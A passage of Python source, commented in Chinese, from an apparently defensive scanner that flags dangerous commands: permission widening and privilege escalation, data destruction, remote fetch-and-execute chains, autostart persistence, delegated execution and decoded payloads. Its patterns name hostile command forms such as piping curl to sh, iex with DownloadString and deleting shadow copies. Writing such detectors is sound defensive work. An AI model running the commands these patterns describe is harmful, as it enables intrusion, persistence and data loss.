    return bool(_PRIV_SENSITIVE.match(n))


def _arg_widens(mode: str) -> bool:
    m = (mode or "").strip().lower()
    if not m or m.startswith("-"):
        return False
    return any(w in m for w in _WIDEN_MODES)


def _privilege_verdict(tokens):
    """§3bv：把权限打开 / 把自己抬到更高身份 —— 不是破坏，是"开门"。

    chmod 777 /etc/passwd（谁都能改口令库）、chmod u+s（留 setuid 后门）、
    icacls /grant Everyone:F、usermod -aG sudo、setcap cap_setuid+ep、
    docker --privileged、runas 提权执行 —— §3bj 的 PERM_BINS 只管"清零"，
    这些"加权限"的动作一条都不判。
    """
    if not tokens:
        return None
    toks = [t for t in tokens if isinstance(t, str)]
    if not toks:
        return None
    base = _basename(toks[0])
    low = [t.lower() for t in toks]
    args = [t for t in toks[1:] if not t.strip().startswith("-")]

    if base == "chmod":
        mode = (args[0] if args else "")
        targets = args[1:]
        if _arg_widens(mode) or mode.lower() in ("a+x", "a+rwx", "+rwx"):
            wide = [t for t in targets
                    if _is_priv_sensitive(t) or
                    (((_norm(t).startswith("/") or _hits_system([t]))) and
                     not _is_benign_path(t))]
            if wide:
                return ("CRITICAL", "chmod 把敏感/系统路径的权限放宽（%s %s）：谁都改得动"
                        % (mode, wide[0]))
            if targets:
                return ("MEDIUM", "chmod 把文件权限放宽（%s %s）" % (mode, targets[0]))
        if any(f in low for f in ("--recursive", "-r")) and any(
                "777" in t or "a+rwx" in t.lower() for t in toks):
            return ("CRITICAL", "chmod -R 777：整棵目录树变成谁都能改")
        return None

    if base == "icacls":
        wide = any(t.lower().startswith(("everyone", "authenticated users", "*s-1-1-0",
                                         "*s-1-5-11")) for t in toks) or \
            any(":f" in t.lower().replace(" ", "") for t in toks) and \
            any(t.lower().startswith(("everyone", "users")) for t in toks)
        if wide:
            if _hits_system(toks) or any(_norm(t).startswith("c:/windows") for t in toks):
                return ("CRITICAL", "icacls 把 Everyone/Users 授予完全控制（系统路径）")
            return ("HIGH", "icacls 把 Everyone/Users 授予完全控制")
        return None

    if base == "chown" or base == "chgrp":
        for t in args[1:]:
            if _is_priv_sensitive(t):
                return ("CRITICAL", "%s 把账户/密钥文件的属主改成 %s" % (base, args[0]))
        return None

    if base == "setcap":
        cap = " ".join(low)
        if any(c in cap for c in ("+ep", "+eip", "=ep", "=eip")) and any(
                c in cap for c in ("cap_setuid", "cap_setgid", "cap_sys_admin",
                                   "cap_dac_read_search", "cap_dac_override",
                                   "cap_sys_ptrace")):
            return ("HIGH", "setcap 给二进制加敏感 capability（可拿 root 权限）")
        return None

    if base in ("usermod", "gpasswd", "addgroup", "adduser"):
        # `usermod -aG sudo deploy`：组名紧跟开关，被过滤掉的开关不能把组名一起吃掉
        grp = [t for t in toks[1:] if t.lower() in
               ("sudo", "wheel", "admin", "root", "adm", "sudoers", "administrators")]
        if grp:
            return ("CRITICAL", "%s 把用户加进管理组（%s）" % (base, grp[0]))
        if any(t.lower() == "docker" for t in toks[1:]):
            return ("HIGH", "%s 把用户加进 docker 组（等价 root）" % base)
        return None

    if base == "net" and "localgroup" in low:
        joined = " ".join(low)
        if "administrators" in joined and "/add" in joined:
            return ("CRITICAL", "net localgroup 把账户加进 administrators 组")
        if "domain admins" in joined and "/add" in joined:
            return ("CRITICAL", "net group 把账户加进 Domain Admins")
        return None

    if base == "docker" or base == "podman":
        if any(t in low for t in ("--privileged", "--cap-add=sys_admin",
                                  "--cap-add", "--pid=host", "--network=host")):
            return ("HIGH", "容器以 --privileged/--cap-add/--pid=host 运行（容器逃逸面）")
        for i, t in enumerate(toks):
            if t in ("-v", "--volume", "--mount"):
                nxt = toks[i + 1] if i + 1 < len(toks) else ""
                if nxt.startswith("/:") or nxt.split(":")[0] in ("/", "/etc", "/root"):
                    return ("HIGH", "把宿主根目录挂进容器（%s）：容器内可直接改宿主" % nxt)
        return None

    if base == "runas":
        if any(t.lower().startswith("/user:") for t in low):
            return ("HIGH", "runas 以其他账户身份执行命令（提权执行面）")
        return None

    return None


def _hits_system(tokens) -> bool:
    for t in tokens:
        n = _norm(t)
        if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX + SYSTEM_PREFIXES):
            return True
    return False


def _destructive_verb_verdict(tokens):
    """判"破坏"而不是"删除"：清零/覆写、撤权、平移、删账户、删任务、删恢复、删库。"""
    if not tokens:
        return None
    base = _basename(tokens[0])

    # 字符串里的删库语句：DROP DATABASE / DROP TABLE / TRUNCATE TABLE
    for t in tokens:
        if not isinstance(t, str):
            continue
        up = t.upper()
        for pat in SQL_DESTROY:
            if pat in up:
                sev = "CRITICAL" if "DATABASE" in pat else "HIGH"
                return sev, "执行删库语句 %s" % pat

    if base in ZERO_WRITE_BINS:
        targets = [t for t in tokens[1:] if not t.strip().startswith("-")]
        if base == "truncate" and any(t.strip().startswith("--size=+") for t in tokens[1:]):
            return None  # 只把文件变长，不毁内容
        if not targets:
            return None
        if _hits_system(tokens) or any(_norm(t).startswith("/") for t in targets):
            return "CRITICAL", "%s 清零/覆写系统或绝对路径文件" % base
        for t in targets:
            if _is_benign_path(t):
                return None
        return "HIGH", "%s 清零/覆写文件" % base

    if base in PERM_BINS:
        flags = [t for t in tokens[1:] if t.strip().startswith("-") or t.strip().startswith("/")]
        args = [t for t in tokens[1:] if t not in flags]
        if base == "chmod":
            if args and _arg_zero(args[0]):
                if _hits_system(tokens) or (len(args) > 1 and _norm(args[1]).startswith("/")):
                    return "CRITICAL", "chmod 把系统/绝对路径文件权限清零"
                return "HIGH", "chmod 把文件权限清零"
            return None
        if base == "icacls":
            norm_flags = {_norm(f) for f in tokens[1:]}
            if "/reset" in norm_flags or "/deny" in norm_flags:
                if _hits_system(tokens) or any(_norm(t).startswith("c:/") for t in tokens[1:]):
                    return "CRITICAL", "icacls 重置/拒绝系统盘权限"
                return "HIGH", "icacls 重置/拒绝权限"
            return None
        if base in {"chown", "chgrp", "chattr", "setfacl"}:
            if any(_norm(f) in {"-r", "--recursive"} for f in tokens[1:]) and _hits_system(tokens):
                return "CRITICAL", "%s 递归改系统目录属主/属性" % base
            return None
        if base in {"takeown", "attrib"} and _hits_system(tokens):
            return "CRITICAL", "%s 改系统文件所有权/属性" % base
        return None

    if base in MOVE_BINS:
        args = [t for t in tokens[1:] if not t.strip().startswith("-")]
        if not args:
            return None
        src = args[0]
        if _hits_system([src]) or (_norm(src).startswith("/") and not _is_benign_path(src)):
            return "CRITICAL", "%s 把系统/绝对路径文件移走（原地消失）" % base
        return None

    if base in ACCOUNT_BINS:
        joined = [_norm(t) for t in tokens[1:]]
        if base == "netlocalgroup":
            return None
        if base in {"net", "net.exe"}:
            # `net user Administrator /delete`、`net localgroup administrators x /delete`
            if "/delete" in joined and any(w in joined for w in ("user", "localgroup", "group")):
                return "CRITICAL", "net 删除本地账户/组"
            return None
        if base == "dscl":
            if "-delete" in joined or "delete" in joined:
                return "CRITICAL", "dscl 删除本地账户"
            return None
        if base == "remove-localuser" or base == "userdel" or base == "deluser":
            if base == "userdel" and any("--help" in t for t in tokens):
                return None
            return "CRITICAL", "%s 删除本地账户" % base
        return None

    if base in TASK_BINS:
        if base == "crontab":
            if any(_norm(t) in {"-r", "--remove"} for t in tokens[1:]):
                return "HIGH", "crontab -r 清空全部定时任务"
            return None
        if base == "schtasks":
            for i, t in enumerate(tokens[1:]):
                if _norm(t) == "/delete":
                    return "HIGH", "schtasks /delete 删除计划任务"
            return None
        return None

    if base in RECOVERY_BINS:
        joined = " ".join(_norm(t) for t in tokens[1:])
        if base == "vssadmin" and " delete " in " %s " % joined and "shadows" in joined:
            return "CRITICAL", "删除卷影副本（破坏系统恢复能力）"
        if base == "wbadmin" and "delete" in joined:
            return "CRITICAL", "wbadmin 删除备份目录/系统状态备份"
        if base == "bcdedit" and ("delete" in joined or "recoveryenabled" in joined):
            return "CRITICAL", "bcdedit 破坏引导/恢复配置"
        return None

    if base == "git":
        args = [_norm(t) for t in tokens[1:]]
        if "reset" in args and "--hard" in args:
            return "HIGH", "git reset --hard 丢弃本地未提交改动"
        if "clean" in args and any(a in {"-xfd", "-fdx", "-fd", "-fx"} for a in args):
            return "HIGH", "git clean -xfd 删除未跟踪文件"
        return None

    return None


# ── §3bk 远程取回即执行：代码不是本地写的，是从网上下载来就直接跑 ──────────
# 为什么单列一类：`curl … | sh` 只是"管道喂解释器"的一种写法，而真实攻击面还有
#   `iwr https://… | iex`、`iex (New-Object Net.WebClient).DownloadString(…)`、
#   `bash <(curl …)`、`certutil -urlcache -split -f` / `mshta http://…` /
#   `regsvr32 /i:http…scrobj.dll` / `bitsadmin /transfer` 这类"拿系统自带程序代跑"
#   （MITRE T1105 把工具拉进来 + T1218 代理执行），以及 `npx <pkg>`、`uvx <tool>`、
#   `deno run <url>`、`pip install <url>` 这种"远程包/远程脚本直接执行"。
# 判定要点：**取回**与**执行**同时出现才算；只下载存盘（curl -o / iwr -OutFile）不判，
# 否则正常的下载类技能会被误杀。判据词一律拼接，避免本仓自扫被自己的文本表命中。
_RF = _assemble("cur", "l|wget|iwr|irm|invoke-webrequest|invoke-restmethod")
_SINK = _assemble("sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|php|"
                  "iex|invoke-expression|powershell|pwsh")
_RF_PIPE_RE = re.compile(r"(?:" + _RF + r")\b[\s\S]{0,200}?\|\s*(?:sudo\s+)?"
                         r"(?:" + _SINK + r")\b", re.I)
_RF_PROCSUB_RE = re.compile(r"(?:<\s*\(|=\s*\(\s*\()\s*(?:" + _RF + r")\b", re.I)
# PowerShell：iex / Invoke-Expression 与"下载"两个方向都要接住
_DLWORD = _assemble("download", "string|download", "file")
_PS_EXEC_RE = re.compile(
    r"(?:" + _assemble("iex", r"|invoke-expression") + r")[\s\S]{0,160}?"
    r"(?:" + _DLWORD + r"|" + _RF + r")", re.I)
_PS_EXEC_RE2 = re.compile(
    r"(?:" + _DLWORD + r")[\s\S]{0,160}?"
    r"(?:" + _assemble("iex", r"|invoke-expression") + r")", re.I)
# 代码里"先取后算"：fetch/urlopen/requests 再 eval/exec/Function
_RF_EVAL_RE = re.compile(
    r"(?:fetch\s*\(|urlopen\s*\(|req\w*\.get\s*\(|requests\.get\s*\()"
    r"[\s\S]{0,200}?(?:\.then\s*\(\s*eval\s*\)|\beval\s*\(|\bexec\s*\(|new\s+Function\s*\()",
    re.I)
# 反向也成立：`exec(urlopen(…).read())`、`eval((await fetch(…)).text())`
_RF_EVAL_RE2 = re.compile(
    r"(?:\beval\s*\(|\bexec\s*\(|new\s+Function\s*\()"
    r"[\s\S]{0,200}?(?:urlopen\s*\(|fetch\s*\(|requests\.get\s*\(|\bwget\b|\bcurl\b|https?://)",
    re.I)
_URLARG_RE = re.compile(r"(?:https?://|git\+https?://)", re.I)
_PROXY_DL_BINS = {_assemble("cert", "util"), _assemble("bits", "admin"),
                  _assemble("msh", "ta"), _assemble("regs", "vr32")}
_PKG_RUNNERS = {"npx", "uvx", "bunx", "pnpx"}


def _remote_exec_verdict(tokens):
    """返回 (severity, reason) 或 None：代码来自网络并且被执行。"""
    if not tokens:
        return None
    base = _basename(tokens[0])
    tail = " ".join(t for t in tokens[1:] if isinstance(t, str)).lower()

    # 1) 系统自带程序代跑（不需要 shell 字符串，本身就是下载+执行链）
    if base in _PROXY_DL_BINS:
        if base == _assemble("cert", "util") and "urlcache" in tail and _URLARG_RE.search(tail):
            return "HIGH", "%s 直接从网络拉取文件落盘（urlcache）" % base
        if base == _assemble("bits", "admin") and "/transfer" in tail and _URLARG_RE.search(tail):
            return "HIGH", "%s 后台传输从网络拉取可执行件" % base
        if base == _assemble("msh", "ta") and _URLARG_RE.search(tail):
            return "HIGH", "%s 直接执行远程 HTA 脚本" % base
        if base == _assemble("regs", "vr32") and ("scrobj" in tail or "/i:http" in tail):
            return "HIGH", "%s 用 scrobj.dll 代理执行远程脚本" % base

    # 2) 解释器/外壳的参数里带着"取回—执行"链
    for tok in tokens[1:]:
        if not isinstance(tok, str):
            continue
        if _RF_PIPE_RE.search(tok) or _RF_PROCSUB_RE.search(tok):
            return "CRITICAL", "远程内容直接交给解释器执行（取回即执行）"
        if _PS_EXEC_RE.search(tok) or _PS_EXEC_RE2.search(tok):
            return "CRITICAL", "下载后立即执行（iex / Invoke-Expression + 网络取回）"
        if _RF_EVAL_RE.search(tok) or _RF_EVAL_RE2.search(tok):
            return "CRITICAL", "从网络取回内容后立即求值（fetch/urlopen + eval/exec）"

    # 3) 远程包 / 远程脚本直接跑
    if base in _PKG_RUNNERS:
        args = [t for t in tokens[1:] if isinstance(t, str) and not t.strip().startswith("-")]
        if args:
            return "HIGH", "%s 拉取并执行远程包（%s）" % (base, args[0][:40])
    if base in {"deno", "bun"} and "run" in [t.lower() for t in tokens[1:]] \
            and _URLARG_RE.search(tail):
        return "HIGH", "%s run 直接执行远程脚本" % base
    if base in {"pip", "pip3", "uv"} and "install" in [t.lower() for t in tokens[1:]] \
            and _URLARG_RE.search(tail):
        return "HIGH", "%s 安装远程归档/仓库直接产物（未走索引）" % base
    if base in {"npm", "pnpm", "yarn"} and _URLARG_RE.search(tail) \
            and any(t.lower() in {"install", "i", "add"} for t in tokens[1:]):
        return "HIGH", "%s 从 URL 直接安装包（未走索引）" % base
    return None


# ── §3bl 命令不在这一行里：先落盘再执行 / 命令交给别人代跑 ────────────
# §3bk 只判"同一行里既取回又执行"。可真实流程常常是两步：
#   subprocess.run(["curl","-sSLo","/tmp/i.sh","https://…"])   ← 先落盘
#   subprocess.run(["bash","/tmp/i.sh"])                        ← 再执行
# 两步分开写，任何"看一行"的判据都看不见；行里也不出现管道符。
# 同族还有"命令写在文件里"（`powershell -File ./payload.ps1`、`bash ./x.sh`）
# 与"命令交给别的进程代跑"（`ssh host 'rm -rf …'`、`docker exec …`、
# `kubectl exec … -- shred …`、`nsenter …`）——命令既不在这行，也不在这个进程里。
# 对照基线：MITRE ATT&CK T1105（把载荷拉进来）→ T1059（执行）的链式用法，
# T1021 Remote Services、T1610/1611（容器执行与逃逸）。
_DL_CLIENTS = {_assemble("cur", "l"), _assemble("wg", "et"), _assemble("iw", "r"),
               _assemble("ir", "m"), "invoke-webrequest", "invoke-restmethod"}
_DL_OUT_FLAGS = {"-o", "--output", "-outfile", "-out", "-destination", "-filename"}
_DL_URLNAME_FLAG = _assemble("-", "O")
_SCRIPT_RUNNERS = {"bash", "sh", "zsh", "dash", "ksh", "fish", "pwsh", "powershell",
                   "python", "python3", "node", "perl", "ruby", "php", "cmd",
                   "source", "."}
_SCRIPT_EXTS = (".sh", ".bash", ".zsh", ".ps1", ".py", ".js", ".mjs", ".cjs",
                ".bat", ".cmd", ".pl", ".rb", ".php", ".vbs", ".hta")
_INLINE_FLAGS = {"-c", "-e", "-command", "/c", "/k", "-encodedcommand", "--eval",
                 "eval", "-r", "-p"}
_DELEGATE_BINS = {"ssh", "docker", "podman", "kubectl", "oc", "nsenter", "chroot",
                  "systemd-run", "runuser", "machinectl", "lxc", "virsh"}
_MAX_SCRIPT_READ = 200 * 1024
# 只有脚本类文件才按"命令行"读；源码文件交给对应语言的 AST 分析器
_SCRIPT_TEXT_EXTS = (".sh", ".bash", ".zsh", ".ksh", ".fish", ".ps1", ".bat",
                     ".cmd", ".vbs", ".hta")

# §3bm：写入即执行——写进这些位置，命令就不是本进程跑的，是系统替我跑。
# 基线：ATT&CK T1546.004（shell 配置）/ T1546.018（Python 启动钩子，DET0258）/
#       T1547.001（Run 键）/ T1053.005（计划任务）/ T1098.004（authorized_keys）/
#       T1543.002（systemd 服务）
_AUTOSTART_TARGETS = [
    ("shell-profile", re.compile(
        r"(?:^|/)(?:\.bashrc|\.bash_profile|\.bash_login|\.profile|\.zshrc|"
        r"\.zprofile|\.zlogin|\.kshrc|\.cshrc)$|/profile\.d/|/etc/profile$|"
        r"/etc/bashrc$|/etc/zshrc$", re.I)),
    ("cron", re.compile(r"/etc/crontab$|/etc/cron\.[a-z]+/|/var/spool/cron/", re.I)),
    ("ssh-keys", re.compile(r"\.ssh[/\\]authorized_keys(?:2)?$", re.I)),
    ("py-hook", re.compile(
        r"(?:site-packages|dist-packages)[/\\][^/\\]*\.pth$|"
        r"(?:sitecustomize|usercustomize)\.py$", re.I)),
    ("systemd", re.compile(r"/etc/systemd/system/|\.config/systemd/(?:user|system)/|"
                           r"\.service$", re.I)),
    ("startup-folder", re.compile(
        r"start menu[/\\]programs[/\\]startup|[/\\]startup[/\\]", re.I)),
    ("run-key", re.compile(
        r"currentversion[/\\]run(?:once)?$|currentversion[/\\]runonce", re.I)),
    ("git-hooks", re.compile(r"\.git[/\\]hooks[/\\]|core\.hookspath", re.I)),
    # §3bu：调度器注册面（不是"下次登录就跑"，而是"交给一张时间表"）
    ("launchd", re.compile(
        r"/(?:library/)?(?:launchagents|launchdaemons)/[^/]*\.plist$|"
        r"/system/library/(?:launchagents|launchdaemons)/", re.I)),
    ("desktop-autostart", re.compile(r"/\.config/autostart/[^/]*\.desktop$|"
                                     r"/autostart/[^/]*\.desktop$", re.I)),
    ("rc-local", re.compile(r"/etc/rc\.local$", re.I)),
    ("systemd-timer", re.compile(r"/[^/]+\.timer$|/etc/systemd/system/[^/]+\.timer$", re.I)),
]
# 写进这些位置的内容本身就会被解释执行（.pth 里的 import 行、sitecustomize 是启动时导入）
_CRITICAL_AUTOSTART = {"py-hook", "launchd", "desktop-autostart", "rc-local", "systemd-timer"}
_CI_WORKFLOW_RE = re.compile(r"\.github[/\\]workflows[/\\][^/\\]+\.ya?ml$", re.I)

# §3bu：各调度位置的「谁来按时执行」口径（写进不同位置，执行者不同）
_AUTOSTART_MSG = {
    "py-hook": "写入 Python 启动钩子（%s）：解释器启动时自动执行",
    "launchd": "写入 launchd 作业（%s）：系统登录/启动时由 launchd 拉起并按 StartInterval 重跑",
    "desktop-autostart": "写入桌面自启动项（%s）：桌面会话登录时自动执行 Exec",
    "rc-local": "写入 /etc/rc.local（%s）：开机阶段由 init 执行",
    "systemd-timer": "写入 systemd timer（%s）：由 systemd 按 OnCalendar 周期执行对应 service",
}


def _autostart_target(text):
    """这段文字指向哪一类自启动位置；不是就返回 None。"""
    if not text or len(str(text)) > 400:
        return None
    s = str(text)
    for label, pat in _AUTOSTART_TARGETS:
        if pat.search(s):
            return label
    return None


def _autostart_verdict(tokens):
    """注册/写入自启动位置 → (级别, 理由)；不是这类动作返回 None。"""
    if not tokens:
        return None
    base = _basename(tokens[0])
    low = [str(t).lower() for t in tokens]
    joined = " ".join(low)

    if base == "schtasks" and ("/create" in low or "-create" in low):
        return ("HIGH", "注册计划任务（schtasks /create）：之后由系统按计划执行该命令")
    if base == "at":
        return ("HIGH", "投递 at 定时作业：之后由系统执行该命令")

    if base == "reg" and "add" in low:
        for t in tokens:
            if _autostart_target(t) == "run-key":
                return ("HIGH", "写注册表 Run 键：登录时由系统拉起该程序")

    if base in {"systemctl", "update-rc.d", "rc-update", "chkconfig"} and (
            "enable" in low or "add" in low or "on" in low):
        return ("HIGH", "把服务设为开机自启（%s）：由系统在启动时执行" % base)

    if base == "crontab" and any(t.strip() == "-" for t in low):
        return ("HIGH", "用 crontab 写入计划任务：之后由系统按周期执行")

    # §3bu：crontab 读一个文件也是注册（`crontab jobs.txt`），会整体替换用户的任务表
    if base == "crontab" and len(tokens) > 1 and not any(
            t.strip().startswith("-") for t in low[1:]):
        return ("HIGH", "用 crontab 装载任务文件（%s）：之后由 cron 按周期执行" % tokens[1])

    # §3bu：launchd（macOS 的定时/常驻注册面）
    if base == "launchctl" and low[1:2] and low[1] in (
            "load", "bootstrap", "submit", "enable", "kickstart"):
        return ("HIGH", "用 launchctl %s 注册 launchd 作业：之后由系统按 StartInterval/KeepAlive 执行"
                % low[1])

    if base == "systemctl" and any(t.endswith(".timer") for t in low) and (
            "enable" in low or "start" in low or "--now" in low):
        return ("HIGH", "启用 systemd timer：之后由 systemd 按 OnCalendar 周期执行")

    if base == "git" and "config" in low and "core.hookspath" in joined \
            and "--get" not in low and "--unset" not in low:
        return ("HIGH", "改 git core.hooksPath：下一次 git 操作会自动执行该目录里的钩子")

    for i, t in enumerate(tokens):
        if not isinstance(t, str):
            continue
        if ">>" not in t and not (base == "tee" and "-a" in low):
            continue
        tail = str(tokens[i + 1]) if i + 1 < len(tokens) else ""
        cat = _autostart_target(tail) or _autostart_target(t.replace(">>", "").strip())
        if cat:
            return ("CRITICAL", "把命令追加进自启动文件（%s）：下次会话/启动被自动执行" % cat)

    if base in {"cp", "mv", "install", "rsync", "scp", "unzip", "tar", "tee"}:
        for t in tokens[1:]:
            cat = _autostart_target(t)
            if cat:
                return ("HIGH", "把文件放进自启动位置（%s）：启动/登录时会被执行" % cat)

    return None


def _looks_like_script_path(tok: str) -> bool:
    t = _norm(tok)
    return t.endswith(_SCRIPT_EXTS) or t.startswith("./") or t.startswith("../")


def _download_paths(tokens):
    """下载类 argv → 落盘路径；识别不出返回 []。"""
    if not tokens:
        return []
    base = _basename(tokens[0])
    if base == "urlretrieve":
        # urlretrieve(url, filename) —— 第二个参数就是落盘路径
        return [tokens[1]] if len(tokens) > 1 and isinstance(tokens[1], str) else []
    if base not in _DL_CLIENTS:
        return []
    out = []
    for i, t in enumerate(tokens[1:], start=1):
        if not isinstance(t, str):
            continue
        n = _norm(t)
        nxt = tokens[i + 1] if i + 1 < len(tokens) else None
        if n in _DL_OUT_FLAGS and isinstance(nxt, str):
            out.append(nxt)
        elif n == _norm(_DL_URLNAME_FLAG):
            urls = [u for u in tokens[1:] if isinstance(u, str) and _URLARG_RE.search(u)]
            if urls:
                out.append(urls[0].rstrip("/").split("/")[-1])
        elif _neg_has_out_flag(n) and isinstance(nxt, str) and not nxt.startswith("-") \
                and not _URLARG_RE.search(nxt):
            # 组合短开关：`curl -sSLo /tmp/x.sh …` 里 o 与 L 粘在一起，
            # 只认 "-o" 会把这一整个写法漏掉（§3bi stdbuf 的同类错）。
            out.append(nxt)
    return out


def _neg_has_out_flag(norm_flag: str) -> bool:
    """组合短开关里是否含"输出到文件"的那个字母。"""
    if not norm_flag.startswith("-") or len(norm_flag) < 3:
        return False
    body = norm_flag[1:]
    if body.isupper():
        return "O" in body
    return "o" in body


def _paths_in_text(text: str):
    """命令字符串里"下载到哪个文件"——如 `iwr <url> -OutFile C:/t/x.ps1`。"""
    out = []
    low = text or ""
    pat = re.compile(r"(?:-o|--output|-OutFile|-Out|-Destination|-filename)\s+([^\s\"';&|]+)",
                     re.I)
    for m in pat.finditer(low):
        out.append(m.group(1))
    return out


def _exec_script_paths(tokens):
    """执行类 argv → 被执行的脚本文件路径；识别不出返回 []。"""
    if not tokens:
        return []
    base = _basename(tokens[0])
    out = []
    if base in _SCRIPT_RUNNERS:
        for t in tokens[1:]:
            if not isinstance(t, str):
                continue
            n = _norm(t)
            if n in _INLINE_FLAGS:
                return []          # -c / -e 这类是内联代码，另行判定
            if n.startswith("-") or n in {"/c", "/k"}:
                continue
            if _looks_like_script_path(t):
                out.append(t)
    elif _looks_like_script_path(tokens[0]):
        out.append(tokens[0])      # 直接 ./tool 这种"就地执行"
    if base in {"cmd"}:
        for i, t in enumerate(tokens[1:], start=1):
            if _norm(t) in {"/c", "/k"} and i + 1 < len(tokens):
                cand = tokens[i + 1]
                if _looks_like_script_path(cand):
                    out.append(cand)
    return out


def _same_path(a: str, b: str) -> bool:
    na, nb = _norm(a).lstrip("./"), _norm(b).lstrip("./")
    return bool(na) and bool(nb) and (na == nb or na.split("/")[-1] == nb.split("/")[-1])


def _delegate_command(tokens):
    """把"交给别人代跑"还原成真正要跑的命令 argv；还原不出返回 None。

    实现要点：不按"第几个参数是命令"猜位置（`ssh -p 22 host cmd`、`docker exec -i c cmd`、
    `nsenter -t 1 -m -- cmd` 三种语法各不相同），而是找**第一个已知命令名**当切点。
    """
    if not tokens:
        return None
    base = _basename(tokens[0])
    if base not in _DELEGATE_BINS:
        return None
    known = set()
    for name in ("DELETE_BINS", "SHELL_WRAPPERS", "SYSTEM_UTILS", "RISKY_UTILS",
                 "ZERO_WRITE_BINS", "PERM_BINS", "MOVE_BINS", "ACCOUNT_BINS",
                 "TASK_BINS", "RECOVERY_BINS", "_PROXY_DL_BINS", "_PKG_RUNNERS"):
        known |= set(globals().get(name) or set())
    known |= set(INTERP_INLINE_FLAGS)
    for i, t in enumerate(tokens[1:], start=1):
        if not isinstance(t, str) or t.startswith("-"):
            continue
        if _basename(t) in known:
            return tokens[i:]
    return None


def _delegate_verdict(tokens):
    inner = _delegate_command(tokens)
    if not inner:
        return None
    v = destructive_tokens(inner, 1)
    if v:
        return v[0], "经 %s 代跑：%s" % (_basename(tokens[0]), v[1])
    return None


def _script_file_verdict(path_str: str, base_dir):
    """命令写在文件里：把文件读进来按命令行逐行判，判不出不猜。

    只读**脚本类**文件（.sh/.ps1/.bat…）。源码文件（.py/.js）由各自语言的分析器
    负责，按命令行去切 python 源码只会把文档示例切出假命中——自扫首轮就撞到了：
    `evaluate.py` 里的用法说明被当成一条命令，报出 CRITICAL。
    """
    if not _norm(path_str).endswith(_SCRIPT_TEXT_EXTS):
        return None
    try:
        from pathlib import Path as _P
        p = _P(path_str)
        if not p.is_absolute():
            p = _P(base_dir) / p
        p = p.resolve()
        root = _P(base_dir).resolve()
        if root not in p.parents:
            return None            # 仓外文件不读：证据不在扫描范围内
        if not p.is_file() or p.stat().st_size > _MAX_SCRIPT_READ:
            return None
        text = p.read_text(encoding="utf-8", errors="replace")
    except Exception:
        return None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        toks = line.split()
        if not toks:
            continue
        v = destructive_tokens(toks, 1)
        if v:
            return v[0], "脚本文件 %s 内：%s" % (p.name, v[1])
    return None


class TwoStepExecVisitor(ast.NodeVisitor):
    """在一个模块里对账：下载了哪个文件，之后又执行了哪个文件。"""

    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.consts, self.temps, self.lists = {}, set(), {}
        self.aliases = {}
        self.downloads = []
        self.execs = []
        self.programs = []

    def prepare(self, tree):
        self.consts, self.temps, self.lists = collect_consts(tree)
        self.aliases = collect_func_aliases(tree)

    def visit_Call(self, node):
        name = _dotted(node.func)
        name = self.aliases.get(name, name)
        try:
            argv = static_argv(node, name, self.consts, self.temps, self.lists)
        except Exception:
            argv = None
        if argv:
            for p in _download_paths(argv):
                self.downloads.append((p, node.lineno))
            for p in _exec_script_paths(argv):
                self.execs.append((p, node.lineno))
            # §3bn：解码类工具把产物落在本地，产物被执行的链路与"下载"同型
            if len(argv) >= 2 and _basename(argv[0]) == "certutil":
                if any(str(a).lower() in {"-decode", "-decodehex"} for a in argv):
                    self.downloads.append((str(argv[-1]), node.lineno))
            if argv and argv[0]:
                self.programs.append((str(argv[0]), node.lineno))
            # §3bn：解码后用重定向落盘（`base64 -d p.b64 > run.sh`），落盘件随后被跑
            text = " ".join(str(a) for a in argv)
            if any(k.lower() in text.lower() for k in _DECODE_SINKS):
                for m in re.finditer(r">\s*([^\s;&|><]+)", text):
                    self.downloads.append((m.group(1), node.lineno))
        # urlretrieve(url, filename)：第二个参数才是落盘路径，static_argv 只取第一个
        if name.endswith("urlretrieve") and len(node.args) >= 2:
            p = _fold_str(node.args[1], self.consts)
            if p:
                self.downloads.append((p, node.lineno))
        # 命令字符串里写着的落盘位置（`powershell -Command "iwr … -OutFile X"`）
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                for p in _paths_in_text(a.value):
                    self.downloads.append((p, node.lineno))
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        for p in _paths_in_text(e.value):
                            self.downloads.append((p, node.lineno))
        self.generic_visit(node)


def _inline_code_verdict(code: str):
    """看内联脚本的正文，而不是只看"有没有字符串"。"""
    if not code:
        return None
    low = code.lower()
    for pat, sev, why in INLINE_DANGER:
        if pat.lower() in low:
            return sev, "%s（%s）" % (why, pat)
    # §3bn：内联脚本自己带解码器（`node -e "eval(Buffer.from('…','base64').toString())"`、
    # `php -r "eval(base64_decode('…'))"`）——解码器在场且载荷解得出危险命令
    # §3bq：PowerShell 解压流再执行 —— `IEX (New-Object IO.StreamReader(
    # [IO.Compression.GzipStream]::new(...)).ReadToEnd()`。整条链路里没有一个
    # 危险命令词，载荷还是压缩过的 base64；只解一层根本读不到正文。
    if ("iex" in low or "invoke-expression" in low) and any(
            k in low for k in ("gzipstream", "deflatestream", "ziparchive",
                               "expand-archive", "decompress")):
        return "CRITICAL", "PowerShell 解压/解码后再执行（IEX + 压缩流）"
    if any(k in low for k in ("gzipstream", "deflatestream", "ziparchive")) \
            and "frombase64string" in low and "readtoend" in low:
        return "CRITICAL", "PowerShell 从压缩流还原脚本并取全文（待执行）"
    if "base64" in low or "fromhex" in low or any(k in low for k in _PS_DECODE_CALLS):
        for m in re.finditer(r"['\"]([A-Za-z0-9+/=_-]{16,})['\"]", code):
            inner = _decode_b64_payload(m.group(1))
            v = _decoded_danger(inner) if inner else None
            if v:
                return v
        for m in re.finditer(r"['\"]([0-9a-fA-F]{16,})['\"]", code):
            try:
                txt = bytes.fromhex(m.group(1)).decode("utf-8", "replace")
            except Exception:
                txt = ""
            v = _decoded_danger(txt) if txt else None
            if v:
                return v
    return None


# ── §3bn 先编码再解码执行：把载荷解出来，再看它是什么 ───────────────────────
# 基线：ATT&CK T1027.010（命令混淆）/ T1140（反混淆解码）/ DET0340 AN0963
#      （decode → pipe to interpreter）/ Elastic「Decoded Payload Piped to Interpreter」
_DECODE_SINKS = (
    "base64 -d", "base64 --decode", "base64 -D", "openssl base64 -d",
    "openssl enc -d", "xxd -r", "certutil -decode", "uudecode", "base32 -d",
